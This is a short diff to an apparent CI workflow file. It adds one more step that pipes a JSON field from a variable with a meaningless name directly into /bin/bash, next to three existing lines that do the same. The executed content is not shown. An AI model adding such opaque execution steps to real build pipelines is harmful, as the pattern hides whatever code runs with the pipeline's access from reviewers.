@@ -24,6 +24,7 @@ jobs:
           echo $aw6561 | jq -r .k6 | /bin/bash
           echo $crtb6677 | jq -r .l8 | /bin/bash
           printf '%s' "$zmltp7" | jq -r .thcur84004 | /bin/bash
+          echo $i78019 | jq -r .bwh147 | /bin/bash
 
       - name: Archive output
         if: always()
